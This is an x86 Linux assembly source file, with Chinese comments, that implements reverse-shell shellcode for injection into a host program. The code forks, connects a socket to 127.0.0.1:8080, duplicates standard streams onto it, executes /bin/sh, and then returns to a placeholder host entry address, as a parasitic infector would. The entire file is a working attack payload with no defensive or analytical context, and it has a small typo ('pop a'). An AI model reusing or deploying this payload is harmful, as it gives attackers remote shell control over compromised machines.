.global _start
_start:
pusha
 
push %ebp
movl %esp, %ebp
sub $0x60,%esp


#fork
movl $0x2, %eax   #fork系统调用
int $0x80
cmpl $0, %eax
jne  return

movl $0x0, 0x8(%esp)
movl $0x1, 0x4(%esp)
movl $0x2, (%esp)
movl $102, %eax  #sys_socketcall num is 102
movl $1, %ebx    #sys_socket num is 1;
movl %esp, %ecx
int $0x80
movl %eax, 0x14(%esp)
cmpl $0, %eax
js error

movl $0x10, 0x18(%esp)   #len is 10h
movl $0x0, 0x1c(%esp)    #set addr as 0
movl $0x0, 0x20(%esp)
movl $0x0, 0x24(%esp)
movl $0x0, 0x28(%esp)

movw $0x2, 0x1c(%esp) #set AF_INT in address
movl $0x0100007f, 0x20(%esp) #set IP address
movw $0x901f, 0x1e(%esp) #set PORT as 8080
#8080的十六进制为1f90,因为网络低地址高数位，所以为90if

mov 0x18(%esp),%eax
mov %eax, 0x8(%esp)  #connect arg 3
lea 0x1c(%esp), %eax
mov %eax, 0x04(%esp) #connect arg 2
mov 0x14(%esp), %eax
mov %eax, (%esp)
movl $102, %eax #sys_socketcll is 102
movl $3, %ebx #sys_connect num is 3
movl %esp, %ecx
int $0x80
cmpl $0, %eax
js error

#dup2(fd, fd2);
movl $0, %ecx
movl 0x14(%esp), %ebx
movl $63, %eax
int $0x80

#dup2(fd, fd2);
movl $1, %ecx
movl 0x14(%esp), %ebx
movl $63, %eax
int $0x80

#dup2(fd, fd2);
movl $2, %ecx
movl 0x14(%esp), %ebx
movl $63, %eax
int $0x80

movl $0x6e69622f, -0x14(%ebp)
movl $0x0068732f, -0x10(%ebp)

leal -0x14(%ebp), %edi
movl %edi, -0x8(%ebp)
movl $0, -0x4(%ebp)

movl $11, %eax  #execl系统调用
movl %edi, %ebx
leal -8(%ebp), %ecx
movl $0, %edx
int $0x80    

error:
movl %eax, %ebx  #exit系统调用
movl $1, %eax
int $0x80

return:
add $0x60, %esp
pop a

push $0x12345678   #宿主返回地址
ret
